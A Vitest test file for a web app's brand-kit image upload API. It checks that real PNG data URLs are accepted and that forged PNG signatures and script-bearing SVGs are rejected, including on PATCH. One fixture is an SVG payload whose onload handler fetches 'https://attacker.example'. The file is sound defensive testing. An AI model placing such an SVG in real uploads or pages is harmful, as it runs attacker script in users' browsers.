import { beforeEach, describe, expect, it } from 'vitest'
import { createApp } from '../src/app'
import { resetDataStoreForTest } from '../src/lib/data-store'

const app = createApp()
const safePng = `data:image/png;base64,${Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
]).toString('base64')}`
const unsafeSvg = `data:image/svg+xml;base64,${Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://attacker.example\')"><rect width="10" height="10"/></svg>',
).toString('base64')}`

const kit = {
  name: '安全品牌',
  description: '品牌图片策略测试',
  primary: '#2563eb',
  secondary: '#0891b2',
  accent: '#7c3aed',
  background: '#f8fafc',
  surface: '#ffffff',
  text: '#0f172a',
  muted: '#64748b',
  headingFont: 'geometric-sans',
  bodyFont: 'modern-sans',
  radius: 14,
  buttonStyle: 'solid',
  shadow: 'soft',
  isDefault: false,
} as const

beforeEach(() => resetDataStoreForTest())

async function login(): Promise<string> {
  const request = await app.request('/api/auth/request-code', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'brand-image-security@example.com' }),
  })
  const code = (await request.json()).debugCode
  const verified = await app.request('/api/auth/verify', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'brand-image-security@example.com', code }),
  })
  return (await verified.json()).accessToken
}

function headers(token: string): Record<string, string> {
  return { authorization: `Bearer ${token}`, 'content-type': 'application/json' }
}

describe('品牌套件内嵌图片安全', () => {
  it('接受文件签名合法的静态图片', async () => {
    const token = await login()
    const response = await app.request('/api/brand-kits', {
      method: 'POST',
      headers: headers(token),
      body: JSON.stringify({ ...kit, logoDataUrl: safePng, faviconDataUrl: safePng }),
    })
    expect(response.status).toBe(201)
    expect((await response.json()).brandKit).toMatchObject({ logoDataUrl: safePng, faviconDataUrl: safePng })
  })

  it('拒绝伪造图片签名和包含主动内容的 SVG', async () => {
    const token = await login()
    const fakePng = `data:image/png;base64,${Buffer.from('not-a-png').toString('base64')}`

    const fake = await app.request('/api/brand-kits', {
      method: 'POST',
      headers: headers(token),
      body: JSON.stringify({ ...kit, logoDataUrl: fakePng }),
    })
    expect(fake.status).toBe(400)
    expect((await fake.json()).error.message).toContain('PNG 文件签名无效')

    const svg = await app.request('/api/brand-kits', {
      method: 'POST',
      headers: headers(token),
      body: JSON.stringify({ ...kit, name: '危险 SVG', logoMarkDataUrl: unsafeSvg }),
    })
    expect(svg.status).toBe(400)
    expect((await svg.json()).error.message).toContain('SVG 包含脚本')
  })

  it('危险图片 PATCH 失败时不改变原品牌套件', async () => {
    const token = await login()
    const created = await app.request('/api/brand-kits', {
      method: 'POST',
      headers: headers(token),
      body: JSON.stringify({ ...kit, logoDataUrl: safePng }),
    })
    const row = (await created.json()).brandKit

    const rejected = await app.request(`/api/brand-kits/${row.id}`, {
      method: 'PATCH',
      headers: headers(token),
      body: JSON.stringify({ name: '不应落库', ogImageDataUrl: unsafeSvg }),
    })
    expect(rejected.status).toBe(400)

    const stored = await app.request(`/api/brand-kits/${row.id}`, { headers: headers(token) })
    expect(stored.status).toBe(200)
    expect((await stored.json()).brandKit).toMatchObject({ name: kit.name, logoDataUrl: safePng })
  })
})
